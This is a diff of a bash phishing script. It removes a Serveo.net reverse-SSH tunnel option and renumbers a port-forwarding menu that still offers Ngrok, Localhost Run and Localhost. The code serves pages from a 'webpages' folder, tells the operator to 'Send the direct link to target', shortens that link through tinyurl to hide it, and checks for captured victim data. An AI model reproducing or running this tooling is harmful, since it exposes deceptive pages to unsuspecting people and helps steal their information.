@@ -870,27 +870,24 @@ start1() {
         rm -rf sendlink
     fi
         printf "\n"
-        printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Run\e[0m\n"
-        printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
+        printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Run\e[0m\n"
+        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
         default_option_server="1"
         read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
         option_server="${option_server:-${default_option_server}}"
         if [[ $option_server == 1 || $option_server == 01 ]]; then
-            startx
+            start
             elif [[ $option_server == 2 || $option_server == 02 ]]; then
-                start
-                elif [[ $option_server == 3 || $option_server == 03 ]]; then
                 start_local
-                    elif [[ $option_server == 4 || $option_server == 04 ]]; then
-                        start_l
-                        else
-                            printf "\e[1;93m [!] Invalid option!\e[0m\n"
-                            sleep 1
-                            clear
-                            start1
-                            fi
+                elif [[ $option_server == 3 || $option_server == 03 ]]; then
+                start_l
+                    else
+                        printf "\e[1;93m [!] Invalid option!\e[0m\n"
+                        sleep 1
+                        clear
+                        start1
+                        fi
 }
 start_l() {
 def_port="5555"
@@ -952,27 +949,6 @@ sleep 0.75
 done
 }
 
-
-serverx() {
-    printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-    cd webpages/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
-    sleep 2
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-    if [[ -e .sendlink ]]; then
-        rm -rf .sendlink
-    fi
-        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
-        printf "\n"
-        sleep 10 
-        send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-        printf "\n"
-        printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-        send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-        printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
-        printf "\n"
-        checkfound
-}
 
 startx() {
     if [[ -e webpages/$server/ip.txt ]]; then
